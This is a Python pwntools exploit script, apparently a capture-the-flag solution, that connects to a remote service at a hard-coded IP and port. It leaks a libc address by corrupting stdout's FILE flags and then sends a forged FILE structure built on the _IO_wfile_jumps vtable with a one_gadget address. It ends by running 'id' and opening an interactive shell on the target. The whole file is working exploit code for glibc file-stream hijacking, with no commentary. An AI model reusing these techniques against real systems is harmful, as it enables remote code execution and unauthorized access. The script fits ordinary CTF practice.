
from pwn import *
	
elf = context.binary = ELF("chall")
libc = elf.libc

# p = process(aslr=False)
p = remote("34.252.33.37",6969)

# leak
p.sendline( p64(0xfbad1887) + p64(0) * 3)
p.recvline()
leak = u64(p.recv(8))
libc.address = leak - 0x204644
print("libc.address",hex(libc.address))





# fake fd
lock = libc.address + 0x205700
stderr = libc.sym["_IO_2_1_stderr_"]
fp = FileStructure(null=lock)
fp.vtable = (libc.sym["_IO_wfile_jumps"]) 
fp._IO_read_ptr = b"-p\x00"
fp._IO_write_base = 1
fp._IO_write_ptr = 2
fp._IO_read_base = 0
fp._wide_data = stderr - 0x30
payload = bytearray(bytes(fp)) 
payload[0xb0:0xb0+8] = p64(stderr + 8) 
payload[0x70:0x70+8] = p64(libc.address + 0xef52b)
payload = bytes(payload)  

# send payload
print("payload",len(payload))
p.sendline(payload)


sleep(1)
p.sendline("id")

p.interactive()


# gdb.attach(p,"""
# # b _IO_wfile_overflow
# # b *_IO_wfile_overflow+25
# # b *_IO_flush_all+343
# # b *_IO_flush_all+193
# # b *_IO_flush_all+227           
# b *_IO_wdoallocbuf+40
# """)
